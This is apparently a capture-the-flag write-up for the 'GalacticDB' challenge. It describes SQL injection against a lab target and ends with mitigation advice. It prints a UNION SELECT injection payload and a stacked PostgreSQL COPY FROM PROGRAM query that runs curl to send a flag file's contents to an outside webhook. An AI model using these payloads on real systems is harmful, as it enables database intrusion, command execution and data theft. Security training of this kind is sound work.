GalacticDB

TargetIP: 94.237.58.4:57051

The first thing I did was enter the IP address into the search bar of a browser.

<img width="468" height="297" alt="image" src="https://github.com/user-attachments/assets/5d24bde1-c8f4-4dbb-b6bf-84a7584436b2" />

There is a input area. So I switched to burp suite so I can intercept and modify the traffic.

I tried doing SQL injection but it failed. This is because it is not URL encoded.

<img width="468" height="296" alt="image" src="https://github.com/user-attachments/assets/f530f2a9-f938-4dca-810e-1be35f6dbdf6" />

When I did URL encode it I got a 200 OK.

From the database.js that was given to me. I know that there is a total of 9 columns. 

When I try:

-1 UNION ALL SELECT 1, column_name,3,4,5,6,7,8,9 
  FROM information_schema.columns 
  WHERE table_name='flag'—

I get an error. I also was unable to create a table.

I decided to use a resource called webhook.site to catch HTTP requests.

<img width="468" height="298" alt="image" src="https://github.com/user-attachments/assets/87e84af9-3f8b-48b8-a69c-3c6b2da6cfaa" />

From the unique URL I created a sql statement that will allow me to read content. 

The sql statement used is:
COPY+gacor+FROM+PROGRAM+'curl+ https://webhook.site/c014cc78-5d9a-498c-a062-248d9c8561a3 +-d+`/readflag`'; 

It was a success. The flag appeared on my webhook site.

<img width="1684" height="1038" alt="image" src="https://github.com/user-attachments/assets/d5db4db8-9dd9-4434-b48b-ca462506f5f3" />

Risk mitigation strategy:

Some mitigation strategies we can use to prevent this is with parameterized queries, whitelisting, lower-privilege database user, and blocking multi-statement queries. With parameterized queries it allows for no SQL grammar injection and prevents stacked queries. Whitelisting makes it so that before anything is sent to the database it verifies if it is an injection attempt. With least privilege it limits what a SQL injection can do as the user doesn’t have the permissions to modify or drop tables as well as escalate to higher level commands. Blocking multi-statement queries also prevents stacked exploits. 
